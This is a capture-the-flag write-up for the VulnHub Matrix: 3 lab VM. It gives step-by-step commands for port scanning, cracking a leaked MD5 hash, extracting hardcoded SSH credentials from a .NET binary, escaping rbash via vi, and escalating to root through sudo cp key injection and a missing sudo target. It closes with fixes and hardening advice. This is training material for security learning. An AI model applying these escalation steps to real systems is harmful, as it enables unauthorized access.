@@ -1,0 +1,476 @@
+================================================================================
+Matrix: 3 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/matrix-3,326/
+================================================================================
+
+OBJECTIVE  : Get root and read /root/flag.txt
+DIFFICULTY : Intermediate
+KEYWORDS   : Full Port Scan, Directory Crawling, MD5 Cracking, .NET Binary
+             Analysis (monodis), rbash Escape (vi), sudo cp Abuse,
+             Missing sudo Target Creation
+TARGET IP  : 10.0.2.26
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Full-range port scan — essential; SSH runs on non-default port 6464
+nmap -sV -sC -Pn -p- 10.0.2.26
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 15:52 -0400
+Nmap scan report for 10.0.2.26
+Host is up (0.00011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title: Welcome in Matrix
+6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
+|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
+|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
+7331/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+| http-auth:
+| HTTP/1.0 401 Unauthorized
+|_  Basic realm=Login to Matrix
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:D3:9A:01 (Oracle VirtualBox virtual NIC)
+
+# Key observations:
+# - Port 80   : Static Python SimpleHTTPServer landing page
+# - Port 6464 : SSH on non-default port — login target once creds are found
+# - Port 7331 : Python SimpleHTTPServer — immediately requires HTTP Basic Auth
+
+================================================================================
+[2] WEB ENUMERATION — PORT 80
+================================================================================
+
+# Directory brute-force against port 80:
+ffuf -u http://10.0.2.26/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+assets      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
+Matrix      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
+
+# /assets is unremarkable.
+# /Matrix contains a deeply nested subdirectory tree — too many levels for a
+# standard flat wordlist. Recursive crawling is required.
+
+================================================================================
+[3] DIRECTORY CRAWLING — FINDING THE SECRET
+================================================================================
+
+# The /Matrix tree spells out a path thematically: Matrix/n/e/o/6/4/
+# A custom Python crawler discovers the hidden file automatically:
+
+python3 crawler.py http://10.0.2.26/Matrix
+
+[FILE] http://10.0.2.26/Matrix/n/e/o/6/4/secret.gz  (type: application/octet-stream, size: 39)
+
+# Despite the .gz extension the file contains plain ASCII text:
+file secret.gz
+# secret.gz: ASCII text
+
+cat secret.gz
+# admin:76a2173be6393254e72ffa4d6df1030a
+
+# Username and MD5 hash recovered from an unauthenticated endpoint.
+
+================================================================================
+[4] HASH CRACKING — MD5
+================================================================================
+
+# Identify the hash type:
+hash-identifier
+# HASH: 76a2173be6393254e72ffa4d6df1030a
+# Possible Hashs:
+# [+] MD5
+# [+] Domain Cached Credentials
+
+# Plain MD5 — reversible instantly via online lookup or John:
+# https://10015.io/tools/md5-encrypt-decrypt
+# 76a2173be6393254e72ffa4d6df1030a -> passwd
+
+# Confirmed credentials for port 7331:
+#   Username : admin
+#   Password : passwd
+
+================================================================================
+[5] AUTHENTICATED ENUMERATION — PORT 7331
+================================================================================
+
+# Verify auth works:
+curl http://10.0.2.26:7331
+# no auth header received
+
+curl -u admin:passwd http://10.0.2.26:7331/robots.txt
+# User-agent: *
+# Disallow: /data/
+
+# robots.txt discloses /data/. Download the file found there:
+curl -u admin:passwd http://10.0.2.26:7331/data/data -O
+
+file data
+# data: PE32 executable for MS Windows 6.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
+
+# A .NET/Mono executable. Standard Linux tools give limited output;
+# monodis (Mono Disassembler) is required for proper analysis.
+
+================================================================================
+[6] BINARY ANALYSIS — MONO/.NET EXECUTABLE
+================================================================================
+
+# Disassemble the binary to Intermediate Language (IL):
+monodis data 2>&1 --output=data.txt
+
+# Search the IL output for the string "guest" — a likely username:
+grep guest data.txt
+
+IL_028c:  ldstr "guest:7R1n17yN30"
+
+# SSH credentials found hardcoded as a string literal in the binary.
+# "7R1n17yN30" is leet-speak for "TrinityNeo" — consistent with the series.
+#
+# Confirmed credentials:
+#   Username : guest
+#   Password : 7R1n17yN30
+
+================================================================================
+[7] INITIAL ACCESS — SSH & RESTRICTED SHELL ESCAPE
+================================================================================
+
+# SSH is on port 6464 (non-default):
+ssh guest@10.0.2.26 -p 6464
+
+guest@matrix:~$ whoami
+-rbash: whoami: command not found
+
+guest@matrix:~$ echo $PATH
+/home/guest/prog
+
+# Shell is rbash (restricted bash). Only binaries in /home/guest/prog are
+# accessible. Listing what is available:
+
+echo /home/guest/prog/*
+# /home/guest/prog/vi
+
+# vi is present — a well-known GTFOBins escape vector.
+
+# --- rbash escape via vi ---
+vi
+:!/bin/sh
+
+sh-4.4$
+
+# Full unrestricted sh session obtained. Fix the environment:
+export PATH=/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+whoami
+# guest
+
+# NOTE: Alternatively, bypass rbash entirely at login with:
+# ssh guest@10.0.2.26 -p 6464 -t "bash --noprofile"
+
+================================================================================
+[8] PRIVILEGE ESCALATION — guest → trinity (sudo cp abuse)
+================================================================================
+
+sudo -l
+
+# User guest may run the following commands on matrix:
+#     (root)    NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+#     (trinity) NOPASSWD: /bin/cp
+
+# guest can run /bin/cp AS trinity with no password.
+# /bin/cp can overwrite any file writable by trinity — including
+# ~/.ssh/authorized_keys. This allows key injection for passwordless SSH.
+
+# Step 1: Generate an SSH key pair as guest
+ssh-keygen      # accept defaults; keys land in ~/.ssh/
+
+# Step 2: Make the public key world-readable (cp as trinity needs to read it)
+chmod 777 ~/.ssh/id_rsa.pub
+
+# Step 3: Stage the public key from home directory
+cp ~/.ssh/id_rsa.pub /home/guest/id_rsa.pub
+
+# Step 4: Overwrite trinity's authorized_keys via sudo cp
+sudo -u trinity /bin/cp /home/guest/id_rsa.pub /home/trinity/.ssh/authorized_keys
+
+# Step 5: SSH in as trinity using our private key
+ssh trinity@127.0.0.1 -i ~/.ssh/id_rsa -p 6464
+
+trinity@matrix:~$ whoami
+trinity
+
+================================================================================
+[9] PRIVILEGE ESCALATION — trinity → root (missing sudo target)
+================================================================================
+
+sudo -l
+
+# User trinity may run the following commands on matrix:
+#     (root) NOPASSWD: /home/trinity/oracle
+
+# trinity can run /home/trinity/oracle as root — but the file does not exist:
+ls /home/trinity/
+# Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/
+
+# trinity owns her own home directory. She can create oracle with any content.
+# Writing /bin/sh into it and running it via sudo gives an immediate root shell:
+
+echo "/bin/sh" > oracle
+chmod +x oracle
+sudo ./oracle
+
+# whoami
+root
+
+# cd /root
+# ls
+flag.txt
+
+================================================================================
+[10] ROOT FLAG
+================================================================================
+
+# cat flag.txt
+
+             ,----------------,              ,---------,
+        ,-----------------------,          ,"        ,"|
+      ,"                      ,"|        ,"        ,"  |
+     +-----------------------+  |      ,"        ,"    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |  Matrix is      |  |  |     |         |      |
+     |  |  compromised    |  |  |/----|`---=    |      |
+     |  |  C:\>_reload    |  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,"
+     |  `-----------------'  |," .;'| |((((     |  ,"
+     +-----------------------+  ;;  | |         |,"     -morpheus AKA (unknowndevice64)-
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+/_==__==========__==_ooo__ooo=_/'   /___________,"
+`-----------------------------'
+
+-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-
+
+# ROOT FLAG CAPTURED
+
+================================================================================
+[11] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap Full Port Scan (-p-) → Ports 80, 6464 (SSH), 7331
+    |
+    v
+Port 80 — ffuf directory scan → /assets, /Matrix
+    |
+    v
+Python recursive crawler → http://10.0.2.26/Matrix/n/e/o/6/4/secret.gz
+    |
+    v
+secret.gz → admin:76a2173be6393254e72ffa4d6df1030a (plain MD5)
+    |
+    v
+hash-identifier + MD5 lookup → admin:passwd
+    |
+    v
+curl -u admin:passwd → port 7331 robots.txt → /data/ disclosed
+    |
+    v
+Download /data/data → PE32 Mono/.NET executable
+    |
+    v
+monodis data → grep guest → guest:7R1n17yN30 (hardcoded in IL)
+    |
+    v
+ssh guest@10.0.2.26 -p 6464 → rbash restricted shell
+    |
+    v
+vi → :!/bin/sh → rbash escape → full sh as guest
+    |
+    v
+sudo -l → (trinity) NOPASSWD: /bin/cp
+    |
+    v
+ssh-keygen → chmod 777 id_rsa.pub
+→ sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
+    |
+    v
+ssh trinity@127.0.0.1 -i id_rsa -p 6464 → shell as trinity
+    |
+    v
+sudo -l → (root) NOPASSWD: /home/trinity/oracle (file missing)
+    |
+    v
+echo "/bin/sh" > oracle && chmod +x oracle && sudo ./oracle → Root Shell
+    |
+    v
+cat /root/flag.txt — SYSTEM PWNED
+
+================================================================================
+[12] VULNERABILITIES IDENTIFIED
+================================================================================
+
+1. CREDENTIALS IN UNAUTHENTICATED WEB DIRECTORY — secret.gz (High)
+   Detail   : A file containing admin:MD5hash was stored inside a deeply
+              nested but publicly accessible directory tree under /Matrix
+              on port 80. Path depth provides no meaningful security.
+   Impact   : Any attacker running a recursive crawler obtained credentials
+              for the authenticated port 7331 service.
+   Fix      : Never store credential or configuration files within the web
+              root. Serve sensitive material only over authenticated endpoints.
+
+2. WEAK MD5 PASSWORD HASH (High)
+   Detail   : The admin password was hashed using plain unsalted MD5, and
+              the plaintext ("passwd") is trivially common.
+   Impact   : Reversed instantly with a free online MD5 lookup — no
+              computational effort required.
+   Fix      : Use bcrypt, scrypt, or Argon2 for all password storage.
+              Enforce strong passwords and reject entries from known wordlists.
+
+3. CREDENTIALS HARDCODED IN DISTRIBUTED .NET BINARY (High)
+   Detail   : SSH credentials (guest:7R1n17yN30) were embedded as a string
+              literal in a .NET assembly served over HTTP. monodis
+              decompiles the binary to readable IL in seconds.
+   Impact   : SSH access was obtained with a single grep command.
+   Fix      : Never hardcode credentials in application code or binaries.
+              Use environment variables or a secrets manager at runtime.
+              Treat any distributed binary as fully reversible.
+
+4. RESTRICTED SHELL BYPASS VIA vi GTFOBins (Medium)
+   Detail   : The guest account used rbash with only /home/guest/prog in
+              PATH. vi was the sole permitted binary. vi supports arbitrary
+              shell execution via :!/bin/sh — a well-documented GTFOBins
+              technique — rendering the restriction ineffective.
+   Impact   : rbash was bypassed in under 10 seconds.
+   Fix      : Never permit editors (vi, vim, nano, less, more, awk, etc.)
+              in a restricted shell. Verify all permitted binaries against
+              GTFOBins. Prefer ForceCommand or containerised shells over
+              rbash for restricted access.
+
+5. PRIVILEGE ESCALATION VIA sudo cp — guest → trinity (High)
+   Detail   : guest was permitted to run /bin/cp as trinity with no
+              password. cp can write to any path writable by trinity,
+              including ~/.ssh/authorized_keys.
+   Impact   : Full lateral movement to trinity with no interaction from
+              the trinity account required.
+   Fix      : Never grant sudo permission for file-manipulation utilities
+              (cp, mv, rsync, scp). Audit all sudo rules for unintended
+              write paths. Verify against GTFOBins before deployment.
+
+6. PRIVILEGE ESCALATION VIA MISSING sudo TARGET — trinity → root (Critical)
+   Detail   : trinity was permitted to run /home/trinity/oracle as root.
+              The file did not exist, and trinity owned her home directory,
+              allowing her to create oracle with arbitrary content.
+   Impact   : Immediate root shell via echo "/bin/sh" > oracle && sudo ./oracle
+   Fix      : Verify all files referenced in sudo rules exist before
+              deployment and are owned by root. Ensure the containing
+              directory is not writable by the permitted user. Regularly
+              audit /etc/sudoers for rules referencing writable or
+              non-existent paths.
+
+================================================================================
+[13] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Web Application & Secret Management
+   - Never place credential files inside the web root at any directory depth
+   - Serve sensitive files only over authenticated, access-controlled endpoints
+   - Use a dedicated secrets manager (e.g. HashiCorp Vault) for all credentials
+   - Never embed credentials in distributed binaries or application source code
+
+2. Password Security
+   - Enforce strong, unique passwords; reject entries from common wordlists
+   - Use bcrypt, scrypt, or Argon2 for all password hashing
+   - Never use plain or salted MD5/SHA-1 for password storage
+   - Rotate credentials regularly and audit for cross-service reuse
+
+3. SSH & Shell Hardening
+   - Run SSH on a non-default port and restrict via firewall / VPN
+   - Validate all rbash permitted binaries against GTFOBins
+   - Prefer SSH ForceCommand or containerised shells over rbash
+   - Bind SSH key authentication to specific source IPs where possible
+
+4. sudo Hardening
+   - Audit all sudo rules with visudo; apply principle of least privilege
+   - Never permit file-manipulation utilities (cp, mv, rsync) as sudo targets
+   - Ensure all sudo-permitted files exist, are root-owned, and reside in
+     directories not writable by the permitted user
+   - Re-audit /etc/sudoers after every system or user configuration change
+
+5. Defense in Depth
+   - Segment networks to restrict access to internal services by port
+   - Enable fail2ban or equivalent on all externally reachable services
+   - Centralise logging (web access, SSH, sudo, shell) and alert on anomalies
+
+================================================================================
+[14] TOOLS USED
+================================================================================
+
+Reconnaissance:
+  nmap           - Full-range port and service scanning (-p-)
+
+Enumeration:
+  ffuf           - Web directory brute-force enumeration
+  Python crawler - Custom recursive directory traversal of /Matrix
+  curl           - HTTP file retrieval with Basic Auth
+
+Credential Attacks:
+  hash-identifier  - MD5 hash type identification
+  MD5 lookup       - Online plaintext reversal (https://10015.io)
+
+Binary Analysis:
+  monodis          - Mono/.NET assembly disassembly (IL output)
+
+Exploitation:
+  vi               - GTFOBins rbash escape via :!/bin/sh
+  ssh-keygen       - SSH key pair generation for lateral movement
+
+Access:
+  SSH              - Remote shell on non-standard port 6464
+
+References:
+  GTFOBins vi  : https://gtfobins.github.io/gtfobins/vi/
+  GTFOBins cp  : https://gtfobins.github.io/gtfobins/cp/
+  monodis      : https://www.mono-project.com/docs/tools+libraries/tools/monodis/
+
+================================================================================
+[15] REFERENCES
+================================================================================
+
+VulnHub:
+  Matrix: 3 VM : https://www.vulnhub.com/entry/matrix-3,326/
+
+GTFOBins vi:
+  https://gtfobins.github.io/gtfobins/vi/
+
+GTFOBins cp:
+  https://gtfobins.github.io/gtfobins/cp/
+
+Mono Disassembler (monodis):
+  https://www.mono-project.com/docs/tools+libraries/tools/monodis/
+
+hash-identifier:
+  https://github.com/blackploit/hash-identifier
+
+OpenSSH:
+  https://www.openssh.com/
+
+================================================================================
+[16] DISCLAIMER
+================================================================================
+
+This writeup is for educational and training purposes only. All techniques
+demonstrated should only be used on systems you own or have explicit written
+permission to test. Unauthorized access to computer systems is illegal and
+may result in criminal prosecution.
+
+The author and VulnHub are not responsible for any misuse of the information
+provided in this writeup. This content is intended to help security
+professionals learn and practice ethical hacking in controlled environments.
+
+================================================================================
